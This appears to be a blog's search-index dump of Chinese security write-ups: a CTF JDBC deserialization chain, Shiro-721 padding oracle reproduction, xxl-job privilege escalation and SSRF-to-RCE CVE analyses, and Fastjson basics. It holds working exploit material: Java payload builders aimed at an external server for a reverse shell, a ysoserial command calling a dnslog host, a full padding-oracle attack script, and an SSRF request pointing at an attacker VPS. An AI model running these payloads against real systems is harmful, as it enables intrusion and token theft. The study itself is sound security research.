obj;&#125;\n\n先看一下serialkiller.conf这个是什么东西。\n\n好像是一个过滤，还是白名单的， 这些正则表达式的作用是允许（即通过白名单）特定的命名空间或类名，例如以 gdufs. 和 java.lang. 开头的类或模块可以被接受，而不受限制。\n因为lib里面有commons-collections-3.2.1.jar，所以可以使用cc5或者cc7来进行反序列化执行命令。\n\n然后进入DatabaseInfo类，可以看到url是由各个参数拼接起来的，没有啥过滤，直接先测试一下能不能弹。\n\n因为在checkAllInfo中使用了connect方法，所以测试中就直接调用checkAllInfo方法了。\npackage gdufs.challenge.web;import gdufs.challenge.web.model.DatabaseInfo;public class cat &#123;    public static void main(String[] args) &#123;        DatabaseInfo databaseInfo = new DatabaseInfo();        databaseInfo.setHost(&quot;127.0.0.1&quot;);        databaseInfo.setPort(&quot;3307&quot;);        databaseInfo.setUsername(&quot;demo&quot;);        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);        databaseInfo.checkAllInfo();    &#125;&#125;\n\npython服务使用之前的代码，然后直接更改ser.bin为cc5的就可以了。\n\n成功弹出计算器。\n然后需要去寻找可以在反序列化时可以调用checkAllInfo的方法了。\n只有一个实现方法，就在InfoInvocationHandler的invoke方法中， 这是一个动态代理的实现类，当代理的实例对象在执行任何方法时都会触发invoke方法。而在hello路由中，被反序列化的数据出来之后会触发getAllInfo()方法，并且题目有Info接口，从而实现动态代理。\n所以只需要把databaseinfo传给InfoInvocationHandler进行动态代理即可触发jdbc。再进行反序列化和base64处理输出即可。\npackage gdufs.challenge.web;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class cat &#123;    public static void main(String[] args) throws Exception&#123;        DatabaseInfo databaseInfo = new DatabaseInfo();        databaseInfo.setHost(&quot;120.76.143.184&quot;); //服务器的ip        databaseInfo.setPort(&quot;3307&quot;);        databaseInfo.setUsername(&quot;demo&quot;);        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), new Class[] &#123;Info.class&#125;, infoInvocationHandler);        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(proxinfo);        objectOutputStream.close();        String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));        System.out.println(str);    &#125;&#125;\n\n记得改cc5的执行为反弹shell\n先去index路由传一个username和password，这样就不需要自己来构造Cookie的格式了。\n\n然后输入序列化数据即可成功反弹shell\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"shiro-721","url":"/2025/05/22/shiro-721/","content":"环境搭建有点小懒哈哈，就直接用的Drunkbaby师傅的环境了，直接用downgit下载了，然后和shiro550一样配一个tomcat就可以了，搭建好之后就是这样子的。\n\n漏洞分析这个漏洞主要基于Padding Oracle Attack攻击，由于shiro对cookie的加密模式为AES-CBC，并且可以从返回中得到从而导致了这个漏洞的存在\nPadding Oracle Attack原理可以参考这几个佬写的，写的很详细。\nhttps://goodapple.top/archives/217\nhttps://lightless.me/archives/padding-oracle-attacks.html#_label2_0\nhttps://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#Padding-Oracle-Attack-%E6%9E%84%E9%80%A0%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90\n我个人的理解是，通过是否能使明文符合填充规律的判断来依次爆破iv最后一个字节到第一个字节的值，以此得到所有正确的明文以及中间值，然后将iv进行修改，从而异或出想要的明文。\nPadding Oracle Attack的利用条件有几个:\n\n是使用AES-CBC进行加密的\n可以获取到密文以及iv\n可以观察到解密的结果是否正确\n\n加密代码分析首先是他的加密代码，在之前的shiro550漏洞的分析过程中，通过对其解密方式的分析寻找到了其AES加密的默认密钥，而后续shiro将默认密钥取消，更改为如果用户不自己设置密钥，就随机生成，在那段代码中就存在AES加密的实现代码。\n首先，找到org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager这个方法就是之前shiro550中找到密钥的方法。\n\n然后看到其加密是调用了AesCipherService这个类的，跟进这个类\n\n这个类很简单，但是他是继承了DefaultBlockCipherService这个类的，所以继续跟进到DefaultBlockCipherService这个类中\n\n找到他的构造函数， 其中继承了父类并初始化了加密算法，其中设置了加密模式为CBC， 并将流式加密的填充方案设置为 PKCS5，这就构成了Padding Oracle Attack的部分条件，也就是加密为AEC-CBC模式。\n密钥生成这里调试一下，来跟一下它密钥生成的过程。\n\n首先可以看到其初始化的一些参数， shiro是通过generateNewKey()方法来获取密钥的，所以调试到generateNewKey中\n\n继续步入到generateNewKey，\n\n然后初始化了一个KeyGenerator，其中getAlgorithmName的参数就是AES，随后调用init()方法，继续步入init()。\n\n其中JceSecurity.RANDOM是一个预定义的 SecureRandom 对象，通常用于提供安全的随机数，随后步入到下面的init()方法中，\n\n其进行了一个初始化的操作，其中engineInit方法用于初始化 AES 加密引擎，继续调试，在engineGenerateKey方法中下一个断点。\n\n这个方法是用于AES的密钥生成的，其中通过定义好的密钥大小进行随机生成密钥。\n\n可以看到密钥已经成功生成了，随后跟进到getEncoded中。\n\n将密钥读取出来，从而完成密钥生成操作\nShiro中的cookie处理操作分析错误处理首先找到解密函数org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()\n\n继续跟进到cipherService.decrypt中，\n\n这个方法用于解密操作，并提取初始化iv，继续跟进到下一个decrypt中。\n\n步入crypt，其进入了doFinal方法。\n\n跟进到doFinal，可以发现其有两个异常处理，分别用于捕获块大小异常和填充错误异常。\n\n如果出现异常的话将会被抛出到crypt() 方法中，并且进入onRememberedPrincipalFailure方法。\n\n跟进到onRememberedPrincipalFailure方法，这个方法又调用了forgetIdentity方法，这个方法就是输出Set-Cookie: rememberMe=deleteMe的方法，因此如果Padding不正确将会输出Set-Cookie: rememberMe=deleteMe。\n\n正确处理当没有报出异常时，程序将继续运行，从而获取于返回解密后的序列化数据。\n\n返回序列化数据后，就和shiro550的反序列化处理是一样的了。\n\n\n\n由于有俩个不同的返回值，正确时正常返回，错误时返回Set-Cookie: rememberMe=deleteMe，因此构成了Padding Oracle Attack的条件。\n漏洞复现首先就是使用yso生成一个payload.class文件，\njava -jar ysoserial-all.jar URLDNS &quot;http://zjc7fd.dnslog.cn&quot; &gt; payload.class\n\n然后用这个脚本跑https://github.com/inspiringz/Shiro-721\n#https://github.com/3ndz/Shiro-721  # -*- coding: utf-8 -*-  from paddingoracle import BadPaddingException, PaddingOracle  from base64 import b64encode, b64decode  from urllib import quote, unquote  import requests  import socket  import time    class PadBuster(PaddingOracle):      def __init__(self, **kwargs):          super(PadBuster, self).__init__(**kwargs)          self.session = requests.Session()          self.wait = kwargs.get(&#x27;wait&#x27;, 2.0)        def oracle(self, data, **kwargs):          somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)          self.session.cookies[&#x27;rememberMe&#x27;] = somecookie          if self.session.cookies.get(&#x27;JSESSIONID&#x27;):              del self.session.cookies[&#x27;JSESSIONID&#x27;]          while 1:              try:                  response = self.session.get(sys.argv[1],                          stream=False, timeout=5, verify=False)                  break              except (socket.error, requests.exceptions.RequestException):                  logging.exception(&#x27;Retrying request in %.2f seconds...&#x27;,                                    self.wait)                  time.sleep(self.wait)                  continue            self.history.append(response)          if response.headers.get(&#x27;Set-Cookie&#x27;) is None or &#x27;deleteMe&#x27; not in response.headers.get(&#x27;Set-Cookie&#x27;):              logging.debug(&#x27;No padding exception raised on %r&#x27;, somecookie)              return          raise BadPaddingException      if __name__ == &#x27;__main__&#x27;:      import logging      import sys        if not sys.argv[3:]:          print &#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27; % (sys.argv[0], )          sys.exit(1)        logging.basicConfig(level=logging.DEBUG)      encrypted_cookie = b64decode(unquote(sys.argv[2]))      padbuster = PadBuster()      payload = open(sys.argv[3], &#x27;rb&#x27;).read()      enc = padbuster.encrypt(plaintext=payload, block_size=16)      print(&#x27;rememberMe cookies:&#x27;)      print(b64encode(enc))\n\n将paddingoracle.py下载下来然后放在一个目录里就可以了\n目录如下\n\npython2 1.py http://192.168.45.1:8080/shiro721_war/account ODTZF2XfGvZt6Sd7nPr1uobDF3wEPLFATG4FI/AnHlfqK84poH1O29Isv1b28yKUPb4Q0+mQJJIOdLjxUGQ/yH6tfO+/vv0ELaDPr10htVAClDEdYbtWN8LETc8tCiAwYshj0ScvakVXDbmjcIVkUA2HEP0KPJJbO5Fy6MgG27XXhikyVnehaqITonX9C1EVFGuvzCZPZygYlHP3Lw+VAXMQ7+fD0P5OrmIwk60DqE7cFWSxkXMi/Q7odK0blH/6rvOrLcirrga0bIi0+6RN/F0Sl9zQSnZCZlZylT1c8HvxYCLblmnZjh8FG7RZpYO4mTkuGp2b6KqkLUEC4cXO+dMGYcscAUWOc+RUeBsSLlB/j/UodYfa98Gzf2luMldcDX1K5YN+Z2j0Qj9TQbU6OTmxbr6+FD9Sf7bJuU8lRQyNSj2sygd/9Q3U5nDUQTq4/B3rb6afnfRYHeG8A4qaNgiYHJxIZ+BcTgclz6IMp4bkGYWdTFcTBMwplckHWpop payload.class\n\n执行成功\n\n工具复现，这个是真快我丢\n\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"xxl-job子任务越权漏洞代码分析及修复代码分析(CVE-2024-42681)","url":"/2025/04/11/xxl-job%E5%AD%90%E4%BB%BB%E5%8A%A1%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-42681)/","content":"漏洞介绍在xxl-job中，普通用户本应该只能查看和执行他们分配到的执行程序上的任务，并且无法查看与执行未分配到的执行程序的任务。但在2.4.1版本中，普通用户可以通过在执行程序 A 上创建任务并使用子任务 ID，从而执行管理员权限才能执行的执行程序 B 上的子任务。\n漏洞代码分析首先，因为是执行时触发的，所以可以直接找到com.xxl.job.admin.controller.JonInfoController这个控制执行程序的类。\n看到其中的权限控制部分\n\npublic static List&lt;XxlJobGroup&gt; filterJobGroupByRole(HttpServletRequest request, List&lt;XxlJobGroup&gt; jobGroupList_all)&#123;    // 创建一个空的列表，用于存储过滤后的组    List&lt;XxlJobGroup&gt; jobGroupList = new ArrayList&lt;&gt;();        // 如果传入的列表不为空且大小大于0    if (jobGroupList_all != null &amp;&amp; jobGroupList_all.size() &gt; 0) &#123;                // 获取当前登录用户对象，存储在请求的属性中，LOGIN_IDENTITY_KEY 是常量表示用户身份信息        XxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);                // 检查用户角色，如果角色是 1，则表示是管理员，管理员可以看到所有组        if (loginUser.getRole() == 1) &#123;            // 如果是管理员，直接返回所有的组            jobGroupList = jobGroupList_all;        &#125; else &#123;            // 如果不是管理员，创建一个列表用于存储用户拥有权限的组 ID            List&lt;String&gt; groupIdStrs = new ArrayList&lt;&gt;();                        // 如果用户的权限字符串不为空，解析出权限字符串并分割为一个列表            if (loginUser.getPermission() != null &amp;&amp; loginUser.getPermission().trim().length() &gt; 0) &#123;                // 将权限字符串（以逗号分隔）转换为列表                groupIdStrs = Arrays.asList(loginUser.getPermission().trim().split(&quot;,&quot;));            &#125;                        // 遍历所有的组列表            for (XxlJobGroup groupItem : jobGroupList_all) &#123;                // 如果当前组的 ID 存在于用户的权限列表中，则加入到返回的列表中                if (groupIdStrs.contains(String.valueOf(groupItem.getId()))) &#123;                    jobGroupList.add(groupItem);                &#125;            &#125;        &#125;    &#125;        // 返回过滤后的组列表    return jobGroupList;&#125;\n\n其中filterJobGroupByRole方法，如果登录为管理员则返回所有执行器，如果不为管理员，则判断用户权限，从而返回相应权限的执行器。\npublic static void validPermission(HttpServletRequest request, int jobGroup) &#123;    // 从请求对象中获取当前登录的用户    XxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);        // 调用 loginUser 的 validPermission 方法来验证用户是否有权限访问指定的组    if (!loginUser.validPermission(jobGroup)) &#123;        // 如果用户没有权限，抛出运行时异常，并将错误信息拼接上用户名        throw new RuntimeException(I18nUtil.getString(&quot;system_permission_limit&quot;) + &quot;[username=&quot; + loginUser.getUsername() + &quot;]&quot;);    &#125;&#125;\n\n第二个方法为validPermission方法，主要用于验证用户是否有权限进行运行。\n检查过后，其实可以发现并没有什么特别明显的漏洞，说明权限绕过的问题并不是出现在这段检查用户权限的代码中。\n然后进入处理子任务id的代码段去进行检查，这段代码位于com.xxl.job.admin.service.impl.XxlJobServiceImpl类中，这个类主要是用于子任务的整个生命周期管理和调度控制。\n\n看到处理子任务id的代码段,add和updata之间是一样的\nif (jobInfo.getChildJobId()!=null &amp;&amp; jobInfo.getChildJobId().trim().length()&gt;0) &#123;\tString[] childJobIds = jobInfo.getChildJobId().split(&quot;,&quot;);\tfor (String childJobIdItem: childJobIds) &#123;\t\tif (childJobIdItem!=null &amp;&amp; childJobIdItem.trim().length()&gt;0 &amp;&amp; isNumeric(childJobIdItem)) &#123;\t\t\tXxlJobInfo childJobInfo = xxlJobInfoDao.loadById(Integer.parseInt(childJobIdItem));\t\t\tif (childJobInfo==null) &#123;\t\t\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,\t\t\t\t\t\tMessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;(&#123;0&#125;)&quot;+I18nUtil.getString(&quot;system_not_found&quot;)), childJobIdItem));\t\t\t&#125;\t\t&#125; else &#123;\t\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,\t\t\t\t\tMessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;(&#123;0&#125;)&quot;+I18nUtil.getString(&quot;system_unvalid&quot;)), childJobIdItem));\t\t&#125;\t&#125;\n\n这段代码是对子任务id进行的检测， 具体来说，它是验证子作业ID是否有效，并且检查每个子作业ID是否存在。其实可以发现，这段代码中并没有对当前用户是否对子任务有操作权限的验证，所以任何用户都可以添加任何一个任务组中的子任务，从而造成漏洞。\n因为这段代码是在add以及updata中的，所以在添加的时候，如果有一个普通用户，其只对任务A有权限进行执行操作，而任务B中拥有一个子任务2，则这个普通用户可以在进行添加操作时，添加子任务2，因为没有对子任务id进行权限验证，这时，普通用户所添加的任务不仅有自身的子任务2同时也添加上了任务B中的子任务2。\n现在，我们再查看执行时的代码有没有对子任务的权限进行检测，如果没有那就会同时执行任务A与任务B中的子任务2。\n执行代码位于trigger方法中\n\npublic ReturnT&lt;String&gt; trigger(XxlJobUser loginUser, int jobId, String executorParam, String addressList) &#123;\t// permission\tif (loginUser == null) &#123;\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;system_permission_limit&quot;));\t&#125;\tXxlJobInfo xxlJobInfo = xxlJobInfoDao.loadById(jobId);\tif (xxlJobInfo == null) &#123;\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;jobinfo_glue_jobid_unvalid&quot;));\t&#125;\tif (!hasPermission(loginUser, xxlJobInfo.getJobGroup())) &#123;\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;system_permission_limit&quot;));\t&#125;\t// force cover job param\tif (executorParam == null) &#123;\t\texecutorParam = &quot;&quot;;\t&#125;\tJobTriggerPoolHelper.trigger(jobId, TriggerTypeEnum.MANUAL, -1, null, executorParam, addressList);\treturn ReturnT.SUCCESS;&#125;\n\n这段代码中，只对用户与任务组的id之间的权限进行了检测，并没有对用户与子任务之间的权限进行检查，也没有判断子任务是否为目标执行的任务组中的子任务。\n综上所属，该漏洞成因为在添加子任务时，没有对用户是否可以对子任务的执行进行权限检测，并且在执行过程中也没有对子任务进行是否有执行权限进行检查，从而导致在运行当前用户的任务组中子任务的同时，也对其他没有权限的任务组中的相同id的子任务进行了执行，从而造成越权漏洞。\n修复代码分析\n可以看到，作者在修复时对add接口与update接口都添加了LoginUser参数，这个参数是用于判断当前用户的参数。\n也就是将鉴权的代码分出了一个部分，让其返回user。\n\n然后，又在add与update中对子任务的验证过程中，添加了对于用户是否有对目标子任务有操作权限的验证。\n\nif (!loginUser.validPermission(childJobInfo.getJobGroup())) &#123;\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,\t\t\tMessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;(&#123;0&#125;)&quot;+I18nUtil.getString(&quot;system_permission_limit&quot;)), childJobIdItem));&#125;\n\n有了这段代码，就不会将没有操作权限的子任务加入到有权限的任务组中，造成越权行为了。\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"xxl-job_2.4.1ssrf漏洞代码分析(CVE-2024-24113)","url":"/2025/03/28/xxl-job_2.4.1ssrf%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-24113)/","content":"漏洞介绍这个漏洞是通过利用ssrf获取用户的 accessToken 进行的任意命令执行漏洞，命令执行部分与之前的默认accessToken的部分基本一致。\nRCE漏洞代码分析首先，我们要清楚为什么获取到了accessToken就可以进行RCE，这离不开以下三个问题：\n\naccessToken是什么\n是通过什么方式进行命令执行的\n命令执行代码分析\n\naccessToken是什么accessToken是XXL-JOB用于校验调度中心（Admin）与执行器（Executor）之间通信合法性的凭证。\n是通过什么方式进行命令执行的执行器是我们执行代码的平台，也就是说如果我们获取了accessToken，我们就可以伪造成校验调度中心，使执行器执行指定代码，这个Rce点在之前的accessToken 默认身份绕过有提到，在2.4.1版本代码基本上没有进行更改，所以如果我们获取到了accessToken的值也是可以进行任意命令执行的。\n2.4.1版本任意命令执行代码分析可以参考一下以前版本的rce漏洞的分析：https://xz.aliyun.com/news/12414\n之前提到了，在2.4.1版本中，漏洞代码与之前版本的变化不大，也是通过&#x2F;run路由进行执行，所以这里我并不进行过多分析。\n我们可以进入xxl-job-core中进行查看目标路由。\nprivate Object process(HttpMethod httpMethod, String uri, String requestData, String accessTokenReq) &#123;            // valid            if (HttpMethod.POST != httpMethod) &#123;                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, HttpMethod not support.&quot;);            &#125;            if (uri == null || uri.trim().length() == 0) &#123;                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, uri-mapping empty.&quot;);            &#125;            if (accessToken != null                    &amp;&amp; accessToken.trim().length() &gt; 0                    &amp;&amp; !accessToken.equals(accessTokenReq)) &#123;                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;The access token is wrong.&quot;);            &#125;            // services mapping            try &#123;                switch (uri) &#123;                    case &quot;/beat&quot;:                        return executorBiz.beat();                    case &quot;/idleBeat&quot;:                        IdleBeatParam idleBeatParam = GsonTool.fromJson(requestData, IdleBeatParam.class);                        return executorBiz.idleBeat(idleBeatParam);                    case &quot;/run&quot;:                        TriggerParam triggerParam = GsonTool.fromJson(requestData, TriggerParam.class);                        return executorBiz.run(triggerParam);                    case &quot;/kill&quot;:                        KillParam killParam = GsonTool.fromJson(requestData, KillParam.class);                        return executorBiz.kill(killParam);                    case &quot;/log&quot;:                        LogParam logParam = GsonTool.fromJson(requestData, LogParam.class);                        return executorBiz.log(logParam);                    default:                        return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, uri-mapping(&quot; + uri + &quot;) not found.&quot;);                &#125;\n\n这一段代码与之前漏洞版本一样，首先是判断accessToken是否正确，然后进行路由判断，因为这里调用是run路由就直接去看他的实现方法。\n进入com.xxl.job.core.biz.impl.ExecutorBizImpl中，可以看到他的run方法。\n\n然后主要是他的命令执行方法。\n位于com.xxl.job.core.handler.impl的ScriptJobHandler类中\nif (!glueType.isScript()) &#123;    XxlJobHelper.handleFail(&quot;glueType[&quot;+ glueType +&quot;] invalid.&quot;);    return;&#125;// cmdString cmd = glueType.getCmd();// make script fileString scriptFileName = XxlJobFileAppender.getGlueSrcPath()        .concat(File.separator)        .concat(String.valueOf(jobId))        .concat(&quot;_&quot;)        .concat(String.valueOf(glueUpdatetime))        .concat(glueType.getSuffix());File scriptFile = new File(scriptFileName);if (!scriptFile.exists()) &#123;    ScriptUtil.markScriptFile(scriptFileName, gluesource);&#125;\n\n这段代码的核心逻辑为\n\n检查 glueType 是否为脚本类型。\n获取脚本执行命令和构建文件名。\n检查指定路径下的脚本文件是否存在，如果不存在，则创建这个脚本文件。\n\n从而可以执行命令。\nSSRF漏洞代码分析既然已经知道了只要拥有accessToken 的值就可以进行任意命令执行，那么就来分析一下获取accessToken 的ssrf代码。\n用户验证首先，我们知道在xxl-job-admin中可以向core发送指定内容，从而使core端执行特定代码，那么这个请求是哪个路由所发出的呢，通过对执行进行抓包可以发现是&#x2F;xxl-job-admin&#x2F;jobinfo&#x2F;trigger。\n\n查看对应代码，位于com.xxl.job.admin.controller.JobInfoController中。\n@RequestMapping(&quot;/trigger&quot;)@ResponseBodypublic ReturnT&lt;String&gt; triggerJob(HttpServletRequest request, int id, String executorParam, String addressList) &#123;\t// login user\tXxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);\t// trigger\treturn xxlJobService.trigger(loginUser, id, executorParam, addressList);&#125;\n\n进入getAttribute中，这个接口有挺多实现的，可以挨个去瞅瞅或者直接调试，最终发现是使用的org.apache.catalina.connector.ReqestFacade中定义的getAttribute方法。\n\npublic Object getAttribute(String name) &#123;    this.checkFacade();    return this.request.getAttribute(name);&#125;\n\n因为checkFacade没有参数，应该不是验证的方法，就直接跳过去了。\n然后，继续跟进到org.apache.catalina.connector.Request中的getAttribute方法。\n\n最终返回了用户相关的值，所以这就是一个验证用户的函数。\n\nssrf关键代码接下来就是实现ssrf的关键代码了，造成这个漏洞的主要参数为addressList。\n首先跟进com.xxl.job.admin.service.impl.XxlJobServiceImpl中的trigger方法。\n\n这个方法前面都是鉴权，还需要继续跟进到com.xxl.job.admin.core.thread.JobTriggerPoolHelper中的trigger方法。\n\n这个方法又继续在进行调用，继续跟进，因为太长了就直接跳到最后一步了，最终走到了com.xxl.job.admin.core.trigger.XxlJobTrigger中进行了参数的设置，可以看到这里用我们上传的参数覆盖了原来的addressList。\n\n可以看到在到这一步时，已经有返回包了。\n\n但是还并没有像指定服务器发送请求。\n跟进最后一个方法processTrigger，这个方法是用于对目标服务器发送请求的方法，也就是造成ssrf的方法。\nTriggerParam triggerParam = new TriggerParam();triggerParam.setJobId(jobInfo.getId());triggerParam.setExecutorHandler(jobInfo.getExecutorHandler());triggerParam.setExecutorParams(jobInfo.getExecutorParam());triggerParam.setExecutorBlockStrategy(jobInfo.getExecutorBlockStrategy());triggerParam.setExecutorTimeout(jobInfo.getExecutorTimeout());triggerParam.setLogId(jobLog.getId());triggerParam.setLogDateTime(jobLog.getTriggerTime().getTime());triggerParam.setGlueType(jobInfo.getGlueType());triggerParam.setGlueSource(jobInfo.getGlueSource());triggerParam.setGlueUpdatetime(jobInfo.getGlueUpdatetime().getTime());triggerParam.setBroadcastIndex(index);triggerParam.setBroadcastTotal(total);// 3、init addressString address = null;ReturnT&lt;String&gt; routeAddressResult = null;if (group.getRegistryList()!=null &amp;&amp; !group.getRegistryList().isEmpty()) &#123;    if (ExecutorRouteStrategyEnum.SHARDING_BROADCAST == executorRouteStrategyEnum) &#123;        if (index &lt; group.getRegistryList().size()) &#123;            address = group.getRegistryList().get(index);        &#125; else &#123;            address = group.getRegistryList().get(0);        &#125;    &#125; else &#123;        routeAddressResult = executorRouteStrategyEnum.getRouter().route(triggerParam, group.getRegistryList());        if (routeAddressResult.getCode() == ReturnT.SUCCESS_CODE) &#123;            address = routeAddressResult.getContent();        &#125;    &#125;&#125; else &#123;    routeAddressResult = new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, I18nUtil.getString(&quot;jobconf_trigger_address_empty&quot;));&#125;// 4、trigger remote executorReturnT&lt;String&gt; triggerResult = null;if (address != null) &#123;    triggerResult = runExecutor(triggerParam, address);&#125;\n\n可以看到上面代码对指定参数进行了构造，并且到目前为止，所以代码都没有对我们输入的地址进行校验与核查。\n随后利用runExecutor 向选定的执行器地址发送HTTP请求，触发任务执行。\n从而使我们的服务器拿到http请求包，其中包含进行RCE所需的参数accessToken，从而造成Rce漏洞。\n\nexp如下POST /xxl-job-admin/jobinfo/trigger HTTP/1.1Host: 127.0.0.1:8080Content-Length: 59sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36sec-ch-ua-platform: &quot;Windows&quot;Origin: http://127.0.0.1:8080Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:8080/xxl-job-admin/jobinfoAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=85b8fh88fc4idmgumrpm2vjf65; XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a2274657374222c2270617373776f7264223a223831646339626462353264303464633230303336646264383331336564303535222c22726f6c65223a302c227065726d697373696f6e223a2232227dConnection: closeid=3&amp;executorParam=1&amp;addressList=http://vps:端口","categories":["代码审计"],"tags":["java，代码审计"]},{"title":"Fastjson基础&1.2.24反序列化学习","url":"/2025/06/06/Fastjson%E5%9F%BA%E7%A1%80&1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/","content":"Fastjson基础&amp;1.2.24反序列化学习Fastjson 是阿里巴巴开源的一个Java语言编写的JSON处理器，用于将Java对象与JSON格式的字符串之间进行转换。简单来说，它能将Java对象序列化为JSON字符串，也能将JSON字符串反序列化为Java对象。\n其中主要有几个重要的函数，JSON.parse，JSON.parseObject 这俩个函数是用于反序列化的，JSON.toJSONString这个函数用于序列化对象\nDemo首先，创建一个类。\npackage org.example;public class Person &#123;    private String name;    private int age;    public int Sex;    public Person() &#123;        System.out.println(&quot;Person constructor&quot;);    &#125;    public String getName() &#123;        System.out.println(&quot;Person.getName()&quot;);        return name;    &#125;    public void setName(String name) &#123;        System.out.println(&quot;Person.setName()&quot;);        this.name = name;    &#125;    public int getAge() &#123;        System.out.println(&quot;Person.getAge()&quot;);        return age;    &#125;    public void setSex(int Sex)&#123;        System.out.println(&quot;Person.setSex()&quot;);        this.Sex=Sex;    &#125;    public int getSex()&#123;        System.out.println(&quot;Person.gerSex()&quot;);        return Sex;    &#125;&#125;\n\n将这个类进行json序列化\npackage org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class Main &#123;    public static void main(String[] args) &#123;        Person person = new Person();        person.setName(&quot;cat&quot;);        String jsonString = JSON.toJSONString(person, SerializerFeature.WriteClassName);        System.out.println(jsonString);    &#125;&#125;\n\n\n可以看到调用了所有get方法之后，输出了json序列化之后的Java对象，再写一个将其反序列化的类\npackage org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.Feature;public class Unserialize &#123;    public static void main(String[] args) &#123;        String jsonString = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.example.Person\\&quot;,\\&quot;Sex\\&quot;:1,\\&quot;age\\&quot;:10,\\&quot;name\\&quot;:\\&quot;cat\\&quot;,\\&quot;sex\\&quot;:1&#125;&quot;;        Person person = (Person) JSON.parse(jsonString);        System.out.println(person);        System.out.println(person.getClass().getName());        System.out.println();        Object person2 = JSON.parseObject(jsonString);        System.out.println(person2);        System.out.println(person2.getClass().getName());        System.out.println();        Object person3 = JSON.parseObject(jsonString, Person.class, Feature.SupportNonPublicField);        System.out.println(person3);        System.out.println(person3.getClass().getName());        System.out.println(((Person) person3).getAge());    &#125;&#125;\n\n\n因为使用了俩个不同的反序列化函数，因此有多段输出，从中可以发现JSON.parse(jsonString)在调用玩所以set方法后直接返Person类，而JSON.parseObject(jsonString);在调用了所以get与set方法之后都没有返回指定值，当第二个参数传入Person.class后JSON.parseObject(jsonString, Person.class);才返回Person类，因此当其序列化时会调用目标的所以get方法以及使用过的set方法，而反序列化时只调用所有的set方法，并且parseObject方法需要传入俩个参数才可以正常返回指定Java对象。\n并且，可以看到图片中的第二段参数，age并没有被赋值，这是由于其没有set方法，并且为private对象导致的，如果真的需要调用的化需要在后面再加上Feature.SupportNonPublicField参数。\n反序列化调用setter&#x2F;getter方法原理可以看到上面的Demo中fastJson对Person类中的getter和setter方法进行了调用操作，因此如果在getter和setter方法中存在可以利用的恶意类并且被fastJson调用了就会进行执行。\n这里在Person中添加一个Properties 对象，这是一个嵌套对象，因此在反序列化的时候将会调用getProperties() 